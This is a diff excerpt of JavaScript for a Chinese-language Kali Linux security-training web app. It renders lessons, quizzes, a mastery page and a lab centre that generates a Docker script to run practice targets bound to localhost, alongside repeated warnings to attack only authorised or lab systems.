+      {q:'如何证明你的检测规则有效？',a:'跑原子测试并给出触发截图、误报统计与性能开销。没有验证的规则等于没有规则。'},
+      {q:'为什么建议在报告里写「修复优先级」而不是「修复清单」？',a:'资源永远有限。按「利用成本 × 影响」排序，才能让客户在有限人力下先把最危险的口子堵上，这也是顾问价值的体现。'}
+    ]},
+    {g:'自检类（做不到就说明还没到那个段位）',items:[
+      {q:'你能不能不看 writeup 打完一台 medium 机器？',a:'这是 D2 的门槛。做不到说明信息收集或提权排查还没有形成固定流程，回去补「提权排查顺序」那一节。'},
+      {q:'你能不能解释你用的每个 payload 的每一个字符？',a:'这是 D3 的门槛。解释不了的部分，就是你知识的空洞，逐个查清比刷十个新靶机有用。'},
+      {q:'你有没有一个自己写的、别人也在用的工具？',a:'这是 D4 的门槛。没有就从一个 100 行的小工具开始，解决你自己每天重复的那件事。'},
+      {q:'你能不能在别人质疑时用证据说服他？',a:'这是 D5 的门槛。大师的标志不是知道得多，而是判断可复现、结论可验证、表达可理解。'}
+    ]}
+  ]
+};
+
+/* ============ state ============ */
+const STORE = 'kali-academy-v1';
+let state = loadState();
+function loadState(){
+  try{
+    const s = JSON.parse(localStorage.getItem(STORE));
+    if(s && typeof s === 'object') return {steps:s.steps||{}, quiz:s.quiz||{}, tasks:s.tasks||{}, last:s.last||null};
+  }catch(e){}
+  return {steps:{}, quiz:{}, tasks:{}, last:null};
+}
+function saveState(){ try{ localStorage.setItem(STORE, JSON.stringify(state)); }catch(e){} }
+
+const $ = s => document.querySelector(s);
+const esc = s => String(s==null?'':s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const allLessons = () => DATA.flatMap(m => m.lessons.map(l => ({...l, mod:m})));
+const findLesson = id => allLessons().find(l => l.id === id);
+const key = (lid,i) => lid + '#' + i;
+const taskKey = (lid,i) => lid + '@' + i;
+const isDone = (lid,i) => !!state.steps[key(lid,i)];
+const lessonDone = l => l.steps.every((s,i) => isDone(l.id,i));
+const lessonPart = l => l.steps.some((s,i) => isDone(l.id,i));
+function lessonPct(l){
+  const d = l.steps.filter((s,i)=>isDone(l.id,i)).length;
+  return Math.round(d / l.steps.length * 100);
+}
+function totals(){
+  let t=0,d=0;
+  DATA.forEach(m=>m.lessons.forEach(l=>l.steps.forEach((s,i)=>{t++; if(isDone(l.id,i)) d++;})));
+  return {t,d};
+}
+const TRY = {};
+
+/* ============ toast ============ */
+let toastTimer;
+function toast(msg){
+  const el = $('#toast'); el.textContent = msg; el.classList.add('show');
+  clearTimeout(toastTimer); toastTimer = setTimeout(()=>el.classList.remove('show'), 1600);
+}
+
+/* ============ nav ============ */
+function renderNav(){
+  const cur = currentLessonId();
+  let html = `<div class="nlink navspecial" data-master="1"><span>🐉 大师之路 · 段位与源码级专题</span></div>
+  <div class="nlink navspecial" data-labs="1"><span>🎯 靶场中心 · 下载与一键部署</span></div>`;
+  DATA.forEach(m=>{
+    const tot = m.lessons.length;
+    const done = m.lessons.filter(lessonDone).length;
+    html += `<div class="mod"><span class="ic">${m.icon}</span>第 ${m.no} 章 · ${esc(m.short||m.name)}<em>${done}/${tot}</em></div>`;
+    m.lessons.forEach(l=>{
+      const cls = l.id===cur ? ' active' : '';
+      const st = lessonDone(l) ? 'done' : (lessonPart(l) ? 'part' : '');
+      html += `<div class="nlink${cls}" data-go="${l.id}"><span class="dot ${st}"></span><span>${esc(l.title)}</span></div>`;
+    });
+  });
+  $('#nav').innerHTML = html;
+  const {t,d} = totals();
+  const pct = t ? Math.round(d/t*100) : 0;
+  $('#sp-text').textContent = pct + '%';
+  $('#sp-bar').style.width = pct + '%';
+  $('#done-pill').textContent = `已完成 ${allLessons().filter(lessonDone).length} / ${allLessons().length} 节`;
+}
+
+/* ============ home ============ */
+function renderHome(){
+  const {t,d} = totals();
+  const lessons = allLessons();
+  const doneL = lessons.filter(lessonDone).length;
+  const first = lessons.find(l=>!lessonDone(l)) || lessons[0];
+  let html = `
+  <section class="hero">
+    <span class="tagline">🐉 Kali Linux · 从第一条命令到完整渗透流程</span>
+    <h1>把网络安全学成一门手艺，而不是一堆命令</h1>
+    <p>11 个方向、${lessons.length} 节课、${t} 个可勾选的实操步骤。每个步骤都写清三件事：<b>敲什么</b>、<b>为什么这么敲</b>、<b>卡住了怎么想</b>。所有实验都在你自己的靶场里完成。</p>
+    <div class="hero-actions">
+      <button class="btn primary" data-go="${first.id}">${doneL? '继续学习' : '从第一课开始'} →</button>
+      <button class="btn ghost" data-go="l2-2">直接看 Web 安全</button>
+      <button class="btn ghost" data-go="l10-1">看 90 天路线</button>
+      <button class="btn ghost" data-master="1">🐉 大师之路 · 从会用到会造</button>
+      <button class="btn ghost" data-labs="1">🎯 靶场中心 · 下载与部署</button>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>${DATA.length}</b><span>学习方向</span></div>
+      <div class="stat"><b>${lessons.length}</b><span>节实操课</span></div>
+      <div class="stat"><b>${t}</b><span>个步骤 + 提示</span></div>
+      <div class="stat"><b>${MASTER.topics.length}+${MASTER.projects.length}</b><span>深挖专题 / 大师项目</span></div>
+    </div>
+    <div class="legalbar">⚠️ <div><b>先读这一句：</b>本课程所有攻击手法仅用于<b>你自己的虚拟机、官方靶场（DVWA / Juice Shop / THM / HTB）或拿到书面授权的目标</b>。未授权扫描、入侵他人系统在中国属违法犯罪（《刑法》285/286 条）。学技术的目的是能防住它。</div></div>
+  </section>
+
+  <h2 class="sec">🗺️ 学习地图 <small>按顺序走最稳，也可以直接跳到你关心的方向</small></h2>
+  <div class="grid">`;
+
+  DATA.forEach(m=>{
+    const dL = m.lessons.filter(lessonDone).length;
+    html += `<div class="mcard" data-go="${m.lessons[0].id}">
+      <div class="top"><div class="ic">${m.icon}</div><div><div class="num">第 ${m.no} 章</div><h3>${esc(m.short||m.name)}</h3></div></div>
+      <p>${esc(m.desc)}</p>
+      <div class="mini"><i style="width:${Math.round(dL/m.lessons.length*100)}%"></i></div>
+      <div class="mmeta"><span>${m.lessons.length} 节课</span><span>${dL}/${m.lessons.length} 完成</span></div>
+    </div>`;
+  });
+
+  html += `</div>
+
+  <h2 class="sec">🚀 三分钟上手 <small>不知道怎么开始？照这个顺序做</small></h2>
+  <div class="card">
+    <p><b>1. 先别急着学攻击。</b>先把 Kali 装进虚拟机、做个快照、把 DVWA 靶场跑起来（第 0 章）。没有可回滚的环境，你会花 80% 的时间在修系统。</p>
+    <p><b>2. 记住一个节奏：</b>看目标 → 收集信息 → 找入口 → 验证假设 → 拿权限 → 写报告。后面每个方向的课程都是这个节奏的变奏。</p>
+    <p><b>3. 每节课只做三件事：</b>把命令敲一遍、把「为什么」读一遍、把自测题做对。三步都过了再打勾，别一路点过去。</p>
+    <p class="muted" style="font-size:13px">提示：每个步骤卡片里都有「💡 卡住了？看提示」，提示是分两级的——先给方向，再给具体命令。先自己想 30 秒，效率最高。</p>
+  </div>
+
+  <h2 class="sec">🧰 你可能需要的靶场 <small>全部合法、免费、可离线</small></h2>
+  <div class="grid">
+    <div class="mcard" data-go="l0-1"><div class="top"><div class="ic">💉</div><div><h3>DVWA</h3></div></div><p>最经典的入门 Web 靶场，四档难度，专治 SQL 注入 / XSS / 上传。</p><div class="mmeta"><span>本机 Docker</span><span>入门</span></div></div>
+    <div class="mcard" data-go="l0-1"><div class="top"><div class="ic">🧃</div><div><h3>OWASP Juice Shop</h3></div></div><p>现代前后端技术栈的综合靶场，覆盖 OWASP Top 10，适合练 Burp。</p><div class="mmeta"><span>本机 Docker</span><span>进阶</span></div></div>
+    <div class="mcard" data-go="l10-1"><div class="top"><div class="ic">🎯</div><div><h3>TryHackMe / HTB</h3></div></div><p>在线引导式房间，一条完整攻击链，适合把零散技能串起来。</p><div class="mmeta"><span>在线</span><span>实战</span></div></div>
+    <div class="mcard" data-go="l10-1"><div class="top"><div class="ic">🏁</div><div><h3>CTF 平台</h3></div></div><p>带flag的闯关题，把“读懂题目”也练成能力。</p><div class="mmeta"><span>在线</span><span>趣味</span></div></div>
+  </div>`;
+
+  $('#view').innerHTML = html;
+}
+
+/* ============ lesson ============ */
+function renderLesson(id){
+  const l = findLesson(id);
+  if(!l){ location.hash = ''; return; }
+  state.last = id; saveState();
+
+  const pct = lessonPct(l);
+  let html = `<div class="crumbs">第 ${l.mod.no} 章 · ${esc(l.mod.short||l.mod.name)} · 第 ${l.mod.lessons.indexOf(l)+1}/${l.mod.lessons.length} 节</div>
+  <h1>${esc(l.title)}</h1>
+  <div class="meta">
+    <span class="tag">⏱ ${esc(l.time)}</span>
+    <span class="tag">📊 ${esc(l.level)}</span>
+    ${(l.tags||[]).map(t=>`<span class="tag">#${esc(t)}</span>`).join('')}
+    ${l.labs?`<span class="tag">🧪 ${l.labs.length} 个靶场任务</span>`:''}
+    ${l.challenge?`<span class="tag">🔥 含进阶挑战</span>`:''}
+    <span class="tag" id="lpct">进度 ${pct}%</span>
+  </div>`;
+
+  html += `<div class="card goal"><h3>🎯 学完这节，你能做到</h3><ul>${l.goal.map(g=>`<li>${esc(g)}</li>`).join('')}</ul></div>`;
+
+  if(l.concepts && l.concepts.length){
+    html += `<div class="concepts">${l.concepts.map(c=>`<div class="concept"><b>${esc(c.t)}</b><p>${esc(c.d)}</p></div>`).join('')}</div>`;
+  }
+
+  html += `<h2 class="sec">🧭 操作步骤 <small>蓝色是「这一步到底在干什么」，别只看命令</small></h2><div class="steps">`;
+
+  l.steps.forEach((s,i)=>{
+    const k = key(l.id,i);
+    const done = isDone(l.id,i);
+    if(s.try) TRY[k] = s.try;
+    html += `<article class="step${done?' done':''}" id="s-${k.replace('#','-')}" data-k="${k}">
+      <div class="step-head">
+        <span class="num">${i+1}</span>
+        <h3>${esc(s.title)}</h3>
+        <label class="check"><input type="checkbox" data-check="${k}" ${done?'checked':''}><span>做完了</span></label>
+      </div>`;
+
+    if(s.cmd) html += `<div class="cmdwrap">
+        <div class="cmdbar"><span class="d"></span><span class="d"></span><span class="d"></span><span style="margin-left:4px">terminal · kali</span><button data-copy="${k}">复制</button></div>
+        <pre><code>${esc(s.cmd)}</code></pre>
+      </div>`;
+
+    if(s.why) html += `<div class="why"><span class="lab">为什么</span><p>${esc(s.why)}</p></div>`;
+    if(s.out) html += `<div class="out"><span class="lab">看什么</span><p>${esc(s.out)}</p></div>`;
+
+    if(s.try) html += `<div class="try" data-k="${k}">
+        <div class="th">✍️ 自己敲一遍（写错会给你方向，不会扣分）</div>
+        <div class="tryrow"><span class="pf">$</span><input placeholder="在这里输入命令，然后点验证" autocomplete="off" spellcheck="false"><button data-try="${k}">验证</button></div>
+        <div class="trymsg" data-msg="${k}"></div>
+      </div>`;
+
+    if(s.hints && s.hints.length){
+      html += `<div class="hints"><button class="hintbtn" data-hint="${k}" data-lv="0">💡 卡住了？看提示（共 ${s.hints.length} 条）</button><div class="hintlist" data-hl="${k}"></div></div>`;
+    }
+    html += `</article>`;
+  });
+  html += `</div>`;
+
+  if(l.deep && l.deep.length){
+    html += `<h2 class="sec">🔍 原理深挖 <small>知道怎么打，还要知道为什么成立</small></h2>
+    <div class="deep">${l.deep.map(d=>`<div class="deepcard"><b>${esc(d.t)}</b><p>${esc(d.d)}</p></div>`).join('')}</div>`;
+  }
+
+  if(l.labs && l.labs.length){
+    html += `<h2 class="sec">🧪 靶场实战任务 <small>在靶场里做一遍，比看十遍强</small></h2>
+    <div class="card"><ul class="tasks">${l.labs.map((t,i)=>{
+      const kk = taskKey(l.id,i), dn = !!state.tasks[kk];
+      return `<li class="task${dn?' done':''}"><label style="display:flex;gap:9px;cursor:pointer;width:100%">
+        <input type="checkbox" data-task="${kk}" ${dn?'checked':''}>
+        <span><span class="tn">${i+1}.</span>${esc(t.task)}<br><span class="tiny muted">🎯 靶场：${esc(t.name)}</span></span>
+      </label></li>`;
+    }).join('')}</ul>
+    <p class="tiny muted" style="margin:10px 0 0">做完打勾即可，任务进度单独记录，不影响课程进度。靶场下载与部署见左侧「靶场中心」。</p></div>`;
+  }
+
+  if(l.pitfalls && l.pitfalls.length){
+    html += `<div class="pit"><b>⚠️ 新手最容易踩的坑</b><ul>${l.pitfalls.map(p=>`<li>${esc(p)}</li>`).join('')}</ul></div>`;
+  }
+
+  if(l.quiz){
+    const answered = state.quiz[l.id];
+    html += `<h2 class="sec">✅ 自测 <small>答对了才算真的懂</small></h2>
+    <div class="quiz" data-q="${l.id}">
+      <div class="q">${esc(l.quiz.q)}</div>
+      ${l.quiz.opts.map((o,i)=>`<button class="opt" data-opt="${i}">${String.fromCharCode(65+i)}. ${esc(o)}</button>`).join('')}
+      <div class="qexp" data-exp="${l.id}">${esc(l.quiz.exp)}</div>
+    </div>`;
+  }
+
+  if(l.challenge && l.challenge.length){
+    html += `<div class="chal"><b>🔥 进阶挑战 · 做完这节才算真的吃透</b><ol>${l.challenge.map(c=>`<li>${esc(c)}</li>`).join('')}</ol></div>`;
+  }
+
+  html += lessonTrail(l);
+
+  const idx = allLessons().findIndex(x=>x.id===l.id);
+  const prev = allLessons()[idx-1], next = allLessons()[idx+1];
+  html += `<div class="lnav">
+    ${prev?`<button class="btn ghost" data-go="${prev.id}">← <span><small>上一节</small>${esc(prev.title)}</span></button>`:'<span></span>'}
+    ${next?`<button class="btn primary" data-go="${next.id}" style="margin-left:auto"><span><small style="color:#cfe0ff">下一节</small>${esc(next.title)}</span> →</button>`:`<span class="btn ghost" data-go="">返回学习地图</span>`}
+  </div>`;
+
+  $('#view').innerHTML = html;
+
+  if(answered && l.quiz){
+    const box = document.querySelector(`.quiz[data-q="${l.id}"]`);
+    box.querySelectorAll('.opt').forEach((b,i)=>{
+      if(i===l.quiz.a) b.classList.add('right');
+      b.disabled = true; b.style.cursor='default';
+    });
+    box.querySelector('.qexp').classList.add('show');
+  }
+}
+
+/* ============ labs page ============ */
+let labCat = '全部';
+
+function buildScript(){
+  const L = [];
+  L.push('#!/usr/bin/env bash');
+  L.push('# Kali 学堂 · 靶场一键部署脚本');
+  L.push('# 用法：sudo bash labs.sh        首次会拉取镜像，约 2-3 GB');
+  L.push('# 说明：所有端口只绑定 127.0.0.1，不暴露到局域网；只启动容器类靶场');
+  L.push('set -u');
+  L.push('');
+  L.push('command -v docker >/dev/null 2>&1 || { echo "未安装 Docker：sudo apt install -y docker.io"; exit 1; }');
+  L.push('docker info >/dev/null 2>&1 || { echo "Docker 未运行：sudo systemctl start docker"; exit 1; }');
+  L.push('');
+  const dockers = LABS.filter(l => (l.run||'').indexOf('docker run') === 0);
+  dockers.forEach((l,i)=>{
+    L.push('# ---------- ' + (i+1) + '. ' + l.name + ' ----------');
+    L.push('# ' + l.desc);
+    L.push('# 访问：' + l.url + (l.login ? '    账号：' + l.login : ''));
+    L.push(l.run.replace(/-p (\d+):/g, '-p 127.0.0.1:$1:'));
+    L.push('');
+  });
+  L.push('echo');
+  L.push('echo "===== 已启动的靶场 ====="');
+  L.push('docker ps --format "table {{.Names}}\\t{{.Ports}}\\t{{.Status}}"');
+  L.push('echo "重置某个靶场：docker rm -f <名字>"');
+  L.push('# 虚拟机类靶场（Metasploitable / VulnHub / GOAD）请按靶场中心里的说明单独搭建');
+  return L.join('\n');
+}
+
+function downloadScript(){
+  const blob = new Blob([buildScript()], {type:'text/x-shellscript;charset=utf-8'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'labs.sh';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(()=>{ URL.revokeObjectURL(a.href); a.remove(); }, 600);
+  toast('labs.sh 已下载，放进 Kali 执行 bash labs.sh');
+}
+
+function renderLabs(){
+  const cats = ['全部'].concat([...new Set(LABS.map(l=>l.cat))]);
+  const list = labCat === '全部' ? LABS : LABS.filter(l=>l.cat === labCat);
+  const dockers = LABS.filter(l => (l.run||'').indexOf('docker run') === 0).length;
+
+  let html = `<div class="hero" style="padding:28px 28px 24px">
+    <span class="tagline">🎯 靶场中心 · 全部合法 · 可离线 · 可回滚</span>
+    <h1 style="font-size:28px">别拿真实网站练手，这里有一整套靶机</h1>
+    <p>${LABS.length} 个靶场：容器类一行命令就起（共 ${dockers} 个），虚拟机类给下载地址，域环境与检测实验室给完整搭建指引。所有命令默认只绑定 127.0.0.1，不会把漏洞机器暴露到局域网。</p>
+    <div class="hero-actions">
+      <button class="btn primary" data-dl-labs="1">⬇ 下载一键部署脚本 labs.sh</button>
+      <button class="btn ghost" data-copy-script="1">复制全部命令</button>
+      <button class="btn ghost" data-go="l0-1">先看怎么隔离环境</button>
+    </div>
+  </div>
+
+  <div class="filters">${cats.map(c=>`<button class="chip${c===labCat?' on':''}" data-chip="${c}">${c}${c==='全部'?' ('+LABS.length+')':''}</button>`).join('')}</div>
+  <div class="labgrid">`;
+
+  html += list.map(l=>{
+    const idx = LABS.indexOf(l);
+    const isWin = /域|Windows|AD|内网/.test(l.cat);
+    return `<article class="lab">
+      <div class="lt"><b>${esc(l.name)}</b>
+        <span class="badge${isWin?' win':''}">${esc(l.cat)}</span>
+        <span class="badge" style="background:#f6f8fc;color:#5a6d88;border-color:#e9eef7">${esc(l.diff)}</span></div>
+      <p class="desc">${esc(l.desc)}</p>
+      <pre>${esc(l.run)}</pre>
+      <div class="row"><span class="muted tiny">访问</span><code>${esc(l.url)}</code>${l.login?`<span class="muted tiny">账号</span><code>${esc(l.login)}</code>`:''}<button data-copy-lab="${idx}">复制命令</button></div>
+      <div class="pts">${(l.points||[]).map(p=>`<span>${esc(p)}</span>`).join('')}</div>
+      <div class="labfoot">📦 ${esc(l.size)} · ${esc(l.note||'')}</div>
+      <div class="labfoot" style="border:0;padding-top:5px">重置：<code>${esc(l.reset)}</code></div>
+    </article>`;
+  }).join('');
+
+  html += `</div>
+  <div class="scriptbox">
+    <b>🧰 一键部署脚本</b>
+    <p class="muted" style="font-size:13px;margin:6px 0 0">下载后放进 Kali 或任意装了 Docker 的机器：<code>sudo bash labs.sh</code>。脚本会自动把端口绑定到 127.0.0.1，并按顺序拉起全部容器靶场。</p>
+    <pre>${esc(buildScript())}</pre>
+    <div class="hero-actions">
+      <button class="btn primary" data-dl-labs="1">⬇ 下载 labs.sh</button>
+      <button class="btn ghost" data-copy-script="1">复制脚本内容</button>
+    </div>
+  </div>
+
+  <div class="legalbar" style="margin-top:18px">⚠️ <div><b>三条纪律：</b>① 虚拟机靶机（Metasploitable / VulnHub）网卡必须设为「仅主机」或「NAT」，<b>绝不能桥接</b>；② 容器别把端口映射到 0.0.0.0 再连公共 WiFi；③ 靶场里可以随便打，靶场之外必须先有书面授权。</div></div>`;
+
+  $('#view').innerHTML = html;
+}
+
+/* ============ master page ============ */
+const TRAIL = {
+  m0:[], m1:[], m2:['t1','t2','t3'], m3:['t6','t9'], m4:['t5'],
+  m5:['t4','t7','t8'], m6:['t4','t11'], m7:['t12'], m8:['t10'],
+  m9:['t12','t11'], m10:['t11']
+};
+const PROJ_TRAIL = {m2:['p2','p3','p8'], m3:['p1'], m5:['p1','p4'], m6:['p4'], m7:['p5'], m8:['p6'], m10:['p7','p1']};
+const topicById = id => MASTER.topics.find(t=>t.id===id);
+
+function renderMaster(focus){
+  const T = MASTER.topics;
+  let html = `<section class="mhero">
+    <span class="tagline">🐉 大师之路 · 从会敲命令，到能定义问题</span>
+    <h1>会用工具只是 D0。分水岭在于：能否把问题<span class="hl">向下沉到源码</span>，再<span class="hl">向上抽象成方法</span>。</h1>
+    <p>这里不是更多教程，而是 ${T.length} 个源码级专题、${MASTER.projects.length} 个端到端项目、6 级段位自检与一套刻意练习表。每个专题都要求你回答「为什么成立」，而不只是「怎么敲」。</p>
+    <div class="depth">${MASTER.depth.map(d=>`<div class="dlayer"><em>${esc(d.k)}</em><b>${esc(d.t)}</b><small>${esc(d.d)}</small></div>`).join('')}</div>
+  </section>`;
+
+  html += `<h2 class="sec">🪜 段位阶梯 <small>对号入座，别跳级——每一级都有可验证的关卡</small></h2>
+  <div class="levels">${MASTER.levels.map(v=>`<div class="lvcard">
+    <b class="code">${esc(v.code)}</b><h4>${esc(v.name)}</h4>
+    <p>${esc(v.can)}</p>
+    <ul>${v.self.map(s=>`<li>${esc(s)}</li>`).join('')}</ul>
+    <div class="gate">🚩 ${esc(v.gate)}</div>
+  </div>`).join('')}</div>
+  <p class="tiny muted" style="margin-top:10px">判断自己在哪一级，只看「关卡」能不能过，不看学了多少小时。过不了就停在当前级补，别急着往下刷。</p>`;
+
+  html += `<h2 class="sec">🧠 四条训练法 <small>决定你 3 年后是「十年经验的工具人」还是「三年经验的专家」</small></h2>
+  <div class="method">${MASTER.methods.map(m=>`<div class="mcard2"><b>${esc(m.t)}</b><p>${esc(m.d)}</p></div>`).join('')}</div>`;
+
+  html += `<h2 class="sec">🔬 源码级专题 <small>${T.length} 个 · 点开就是一篇能复现的深度笔记</small></h2>`;
+  html += T.map(t=>`<details class="topic" id="tp-${t.id}"${focus===t.id?' open':''}>
+    <summary>
+      <span class="tic">${t.ic}</span>
+      <span class="tt"><h4>${esc(t.title)}</h4><span class="q">${esc(t.q)}</span></span>
+      <span class="arw">▶</span>
+    </summary>
+    <div class="tbody">
+      <div class="meta" style="margin:10px 0 0">
+        <span class="tag">${esc(t.cat)}</span><span class="tag">${esc(t.lv)}</span><span class="tag">⏱ ${esc(t.time)}</span>
+      </div>
+      ${t.body.map(b=>`<h5>${esc(b.h)}</h5><p>${esc(b.p)}</p>`).join('')}
+      <div class="tcode"><code>${esc(t.code.t)}</code></div>
+      <div class="tblock"><b>🧪 必做实验</b>${esc(t.exp)}</div>
+      <div class="tblock check"><b>✅ 掌握自检（做不到就回去重读）</b><ul>${t.check.map(c=>`<li>${esc(c)}</li>`).join('')}</ul></div>
+      <div class="tread"><b>延伸阅读：</b>${t.read.map(r=>esc(r)).join(' · ')}</div>
+    </div>
+  </details>`).join('');
+
+  html += `<h2 class="sec">🏗 大师项目 <small>${MASTER.projects.length} 个端到端交付物 · 这些才是简历上能写的东西</small></h2>
+  <div class="grid" style="grid-template-columns:repeat(auto-fill,minmax(400px,1fr))">`;
+  html += MASTER.projects.map(p=>`<div class="proj" id="pj-${p.id}">
+    <div class="ph"><span class="ic">${p.ic}</span><h4>${esc(p.title)}</h4></div>
+    <div class="meta" style="margin:0 0 6px"><span class="tag">${esc(p.lv)}</span><span class="tag">⏱ ${esc(p.time)}</span></div>
+    <div class="why">${esc(p.why)}</div>
+    <ol>${p.steps.map(s=>`<li>${esc(s)}</li>`).join('')}</ol>
+    <div class="del"><b>交付物：</b>${esc(p.del)}</div>
+  </div>`).join('');
+  html += `</div>`;
+
+  html += `<h2 class="sec">📆 刻意练习表 <small>大师不是学出来的，是练出来的</small></h2>
+  <div class="card" style="padding:6px 10px">
+    <table class="drill"><thead><tr><th style="width:20%">项目</th><th style="width:12%">频率</th><th style="width:14%">时长</th><th>怎么做</th></tr></thead>
+    <tbody>${MASTER.drills.map(d=>`<tr><td><b>${esc(d.t)}</b></td><td>${esc(d.f)}</td><td>${esc(d.ti)}</td><td>${esc(d.d)}</td></tr>`).join('')}</tbody></table>
+  </div>`;
+
+  html += `<h2 class="sec">🎤 自检题库 <small>能讲清楚，才算真的懂</small></h2>`;
+  MASTER.qa.forEach(g=>{
+    html += `<h3 style="font-size:14px;margin:18px 0 8px;color:#41546e">${esc(g.g)}</h3>`;
+    html += g.items.map(x=>`<details class="qa"><summary>${esc(x.q)}</summary><div class="ans">${esc(x.a)}</div></details>`).join('');
+  });
+
+  html += `<div class="trail" style="margin-top:22px">
+    <b class="h">🎯 怎么用这一页</b>
+    <p class="tiny muted" style="margin:0">不要顺序读完。先做一次段位自检，找到自己卡在哪个关卡，再只读能解决那个关卡约束的专题；每读完一个专题，必须做完它的「必做实验」并勾掉「掌握自检」，否则不算学过。项目按季度挑一个，做完再进下一个。</p>
+    <div style="margin-top:10px"><button class="btn ghost" data-labs="1">先看靶场中心</button> <button class="btn primary" data-go="l0-1">从第 0 章开始</button></div>
+  </div>`;
+
+  $('#view').innerHTML = html;
+  if(focus){
+    setTimeout(()=>{
+      const el = document.getElementById('tp-'+focus) || document.getElementById('pj-'+focus);
+      if(el) el.scrollIntoView({behavior:'smooth', block:'start'});
+    }, 60);
+  }
+}
+
+function lessonTrail(l){
+  const tids = (TRAIL[l.mod.id]||[]).filter(id=>topicById(id));
+  const pids = (PROJ_TRAIL[l.mod.id]||[]).map(id=>MASTER.projects.find(p=>p.id===id)).filter(Boolean);
+  if(!tids.length && !pids.length) return '';
+  let h = `<div class="trail"><b class="h">⬆️ 再深一层：这节对应的源码级专题</b>`;
+  tids.forEach(id=>{
+    const t = topicById(id);
+    h += `<div class="titem" data-topic="${t.id}"><span>${t.ic}</span><span><span class="ttl">${esc(t.title)}</span><small>${esc(t.cat)} · ${esc(t.lv)} · ${esc(t.time)}</small></span></div>`;
+  });
+  if(pids.length){
+    h += `<b class="h" style="margin-top:10px">🏗 练完可以做的大师项目</b>`;
+    pids.forEach(p=>{
+      h += `<div class="titem" data-proj="${p.id}"><span>${p.ic}</span><span><span class="ttl">${esc(p.title)}</span><small>${esc(p.lv)} · ${esc(p.time)}</small></span></div>`;
+    });
+  }
+  h += `</div>`;
+  return h;
+}
+
+/* ============ router ============ */
+function currentLessonId(){
+  const h = location.hash.replace(/^#\/?/, '');
+  return h.startsWith('lesson/') ? decodeURIComponent(h.slice(7)) : null;
+}
+function isLabsRoute(){
+  return location.hash.replace(/^#\/?/, '') === 'labs';
+}
+function isMasterRoute(){
+  const h = location.hash.replace(/^#\/?/, '');
+  return h === 'master' || h.startsWith('master/');
+}
+function masterFocus(){
+  const h = location.hash.replace(/^#\/?/, '');
+  return h.startsWith('master/') ? decodeURIComponent(h.split('/')[1]) : null;
+}
+function render(){
+  const id = currentLessonId();
+  if(isLabsRoute()) renderLabs();
+  else if(isMasterRoute()) renderMaster(masterFocus());
+  else if(id) renderLesson(id); else renderHome();
+  renderNav();
+  window.scrollTo(0,0);
+  $('#sidebar').classList.remove('open');
+}
+window.addEventListener('hashchange', render);
+
+/* ============ interactions ============ */
+document.addEventListener('click', e=>{
+  const ms = e.target.closest('[data-master]');
+  if(ms){ location.hash = '#/master'; return; }
+  const tp = e.target.closest('[data-topic]');
+  if(tp){ location.hash = '#/master/' + tp.getAttribute('data-topic'); return; }
+  const pj = e.target.closest('[data-proj]');
+  if(pj){ location.hash = '#/master/' + pj.getAttribute('data-proj'); return; }
+  const lb = e.target.closest('[data-labs]');
+  if(lb){ location.hash = '#/labs'; return; }
+  const chip = e.target.closest('[data-chip]');
+  if(chip){ labCat = chip.getAttribute('data-chip'); renderLabs(); window.scrollTo(0,240); return; }
+  const cl = e.target.closest('[data-copy-lab]');
+  if(cl){
+    const lab = LABS[+cl.getAttribute('data-copy-lab')];
+    copyText(lab.run).then(()=>toast('部署命令已复制')).catch(()=>toast('复制失败，手动选中吧'));
+    return;
+  }
+  const dl = e.target.closest('[data-dl-labs]');
+  if(dl){ downloadScript(); return; }
+  const cs = e.target.closest('[data-copy-script]');
+  if(cs){ copyText(buildScript()).then(()=>toast('脚本已复制')).catch(()=>toast('复制失败')); return; }
+  const nav = e.target.closest('[data-go]');
+  if(nav){
+    const id = nav.getAttribute('data-go');
+    location.hash = id ? '#/lesson/' + encodeURIComponent(id) : '';
+    return;
+  }
+  const cp = e.target.closest('[data-copy]');
+  if(cp){
+    const k = cp.getAttribute('data-copy');
+    const [lid, i] = k.split('#');
+    const s = findLesson(lid).steps[+i];
+    copyText(s.cmd).then(()=>toast('已复制，去 Kali 里粘贴吧')).catch(()=>toast('复制失败，手动选中吧'));
+    return;
+  }
+  const hb = e.target.closest('[data-hint]');
+  if(hb){
+    const k = hb.getAttribute('data-hint');
+    const [lid,i] = k.split('#');
+    const hints = findLesson(lid).steps[+i].hints || [];
+    let lv = +(hb.getAttribute('data-lv'));
+    if(lv < hints.length){
+      const box = document.querySelector(`[data-hl="${k}"]`);
+      const div = document.createElement('div');
+      div.className = 'hint';
+      div.textContent = `提示 ${lv+1}：` + hints[lv];
+      box.appendChild(div);
+      lv++;
+      hb.setAttribute('data-lv', lv);
+      hb.textContent = lv >= hints.length ? '💡 提示已全部给出' : `💡 再看一条（${lv+1}/${hints.length}）`;
+      if(lv >= hints.length){ hb.disabled = true; hb.style.opacity = .65; hb.style.cursor='default'; }
+    }
+    return;
+  }
+  const tb = e.target.closest('[data-try]');
+  if(tb){ doTry(tb.getAttribute('data-try')); return; }
+
+  const ob = e.target.closest('[data-opt]');
+  if(ob && !ob.disabled){
+    const box = ob.closest('.quiz');
+    const lid = box.getAttribute('data-q');
+    const l = findLesson(lid);
+    const pick = +ob.getAttribute('data-opt');
+    box.querySelectorAll('.opt').forEach((b,i)=>{
+      b.disabled = true; b.style.cursor = 'default';
+      if(i === l.quiz.a) b.classList.add('right');
+      else if(i === pick) b.classList.add('wrong');
+    });
+    box.querySelector('.qexp').classList.add('show');
+    if(pick === l.quiz.a){ state.quiz[lid] = true; saveState(); toast('答对了 ✓'); }
+    else toast('再想想：正确答案已标绿，读完解释继续');
+    return;
+  }
+
+  const mb = e.target.closest('#btn-menu');
+  if(mb){ $('#sidebar').classList.toggle('open'); return; }
+});
+
+document.addEventListener('change', e=>{
+  const tk = e.target.closest('[data-task]');
+  if(tk){
+    const kk = tk.getAttribute('data-task');
+    if(tk.checked) state.tasks[kk] = true; else delete state.tasks[kk];
+    saveState();
+    const row = tk.closest('.task');
+    if(row) row.classList.toggle('done', tk.checked);
+    return;
+  }
+  const cb = e.target.closest('[data-check]');
+  if(!cb) return;
+  const k = cb.getAttribute('data-check');
+  const [lid,i] = k.split('#');
+  if(cb.checked) state.steps[k] = true; else delete state.steps[k];
+  saveState();
+  const card = cb.closest('.step');
